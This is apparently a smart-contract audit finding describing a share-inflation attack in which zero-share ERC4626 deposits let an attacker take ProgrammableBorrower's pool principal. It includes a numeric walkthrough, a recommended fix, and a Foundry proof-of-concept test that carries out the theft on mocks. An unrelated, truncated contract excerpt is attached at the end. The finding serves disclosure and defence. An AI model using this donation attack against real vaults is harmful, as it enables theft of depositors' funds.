### Title
Zero-share ERC4626 deposits steal programmable-borrower principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower._depositToVault` accepts an ERC4626 deposit that returns zero vault shares without reverting or enforcing a minimum-share bound. [1](#0-0)  An attacker who controls the vault’s shares can inflate its assets-per-share before `onStartEpoch` or `repay`, causing the borrower contract’s deposited assets to become unclaimable while the attacker redeems them through the vault. [2](#0-1) [3](#0-2) 

### Finding Description
At epoch start, `onStartEpoch` snapshots the contract’s cash plus existing vault assets, deposits all cash into the configured ERC4626 vault, and then records the pre-deposit value as `epochStartVaultAssets`. [4](#0-3)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but only emits the returned `shares`; it never requires `shares > 0` or verifies that the minted shares represent the deposited assets. [1](#0-0) 

The ERC4626 interface permits `deposit` to return the actual number of shares minted and warns that unfavorable conversion results constitute depositor loss. [5](#0-4) [6](#0-5)  Therefore, in a vault susceptible to share-price inflation or zero-share rounding, a one-share attacker can deposit one asset unit and donate at least the borrower deposit amount so `amount * 1 / vaultAssetsBefore` rounds to zero.

The same unchecked call is used when active-epoch repayments are redeployed, including repayments whose principal portion is added to `epochDepositedToVault` even though no vault shares were minted. [7](#0-6) [3](#0-2)  No access-control check protects the vault’s exchange rate because the only contract-side guard is the honest `idleCDO` or borrower caller. [8](#0-7) 

### Impact Explanation
After a zero-share deposit, `ProgrammableBorrower` has transferred the underlying to the vault but owns no redeemable shares, so `_currentVaultAssets()` returns zero for that position. [9](#0-8)  `_vaultNetInterest` then compares zero earned assets against an epoch principal baseline that included the deposited cash, producing a vault loss equal to the stolen amount. [10](#0-9) 

For example, with a 1,000,000-unit borrower deposit, an attacker holding one vault share can seed the vault with 1,000,001 units, causing `1,000,000 * 1 / 1,000,001` to mint zero shares. [11](#0-10)  The attacker can redeem the single share for 2,000,001 units, receiving back the 1,000,001-unit seed plus the full 1,000,000-unit pool deposit. [12](#0-11) 

The resulting loss is either hidden in overstated strategy-token backing or must be realized through `stopEpochWithDuration`’s loss path, where it is shared between pending receipts and active tranche holders. [13](#0-12) [14](#0-13)  This is direct theft of pool principal up to the deposited amount, followed by insolvency or BB-first loss socialization. [15](#0-14) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to permit zero-share deposits through rounding, fees, or share inflation and requires the attacker to hold enough vault shares to capture the donated assets. [5](#0-4)  The unprivileged attacker can establish that position independently and front-run an honest owner or manager’s `startEpoch`, which transfers surplus funds to the programmable borrower and immediately invokes `onStartEpoch`. [16](#0-15) 

Likelihood is therefore deployment-dependent rather than universal: a properly guarded vault can make the attack uneconomical, but the contract accepts arbitrary owner-selected ERC4626 vaults and performs no defense of its own. [17](#0-16) [1](#0-0) 

### Recommendation
Preflight and verify every vault deposit with an explicit minimum-share or minimum-asset bound. [1](#0-0) 

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
if (expectedShares == 0) revert InvalidAmount();

uint256 shares = vault.deposit(_assetAmount, address(this));
if (
  shares == 0 ||
  shares < expectedShares ||
  vault.convertToAssets(shares) < _assetAmount
) {
  revert InvalidAmount();
}
```

A configurable slippage tolerance may be used instead of requiring `convertToAssets(shares) >= _assetAmount` when deposit fees are legitimate, but the transaction must revert before accepting zero shares or economically worthless shares. [18](#0-17) 

### Proof of Concept
The following Foundry test reproduces the vulnerable accounting path using the repository’s deterministic ERC4626-style vault while running on a selected fork.

```solidity
// test/foundry/ProgrammableBorrowerZeroShareDeposit.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {
  MockInvariantERC20,
  MockInvariantVault,
  MockInvariantCDO
} from "./ProgrammableBorrowerAccountingInvariant.t.sol";

contract ProgrammableBorrowerZeroShareDepositForkTest is Test {
  MockInvariantERC20 internal underlying;
  MockInvariantVault internal vault;
  ProgrammableBorrower internal borrowerContract;
  address internal idleCDO;
  address internal attacker = makeAddr("attacker");
  address internal realBorrower = makeAddr("realBorrower");

  function setUp() public {
    vm.createSelectFork(vm.envString("ETH_RPC_URL"));

    underlying = new MockInvariantERC20();
    vault = new MockInvariantVault(address(underlying));
    idleCDO = address(new MockInvariantCDO(address(underlying)));

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    borrowerContract = ProgrammableBorrower(
      address(
        new TransparentUpgradeableProxy(
          address(implementation),
          makeAddr("proxyAdmin"),
          abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(vault),
            idleCDO,
            address(this),
            address(this),
            realBorrower,
            0
          )
        )
      )
    );
  }

  function testZeroShareDepositStealsEpochPrincipal() public {
    uint256 depositAmount = 1_000_000e18;

    underlying.mint(attacker, depositAmount + 1);

    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);

    // Attacker owns the only vault share.
    vault.deposit(1, attacker);

    // Make one share cost more than the pool deposit:
    // depositAmount * 1 / (depositAmount + 1) == 0.
    underlying.transfer(address(vault), depositAmount);
    vm.stopPrank();

    // This models the underlying sent to ProgrammableBorrower by startEpoch.
    underlying.mint(address(borrowerContract), depositAmount);

    vm.prank(idleCDO);
    borrowerContract.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrowerContract)), 0);
    assertEq(borrowerContract.vaultSharesBalance(), 0);
    assertEq(borrowerContract.vaultLoss(), depositAmount);
    assertEq(borrowerContract.totalInterestDueNow(), 0);

    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    // Attacker paid depositAmount + 1 and receives depositAmount + 1 + depositAmount.
    assertEq(underlying.balanceOf(attacker), 2 * depositAmount + 1);
    assertEq(underlying.balanceOf(address(vault)), 0);
  }
}
```

```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```
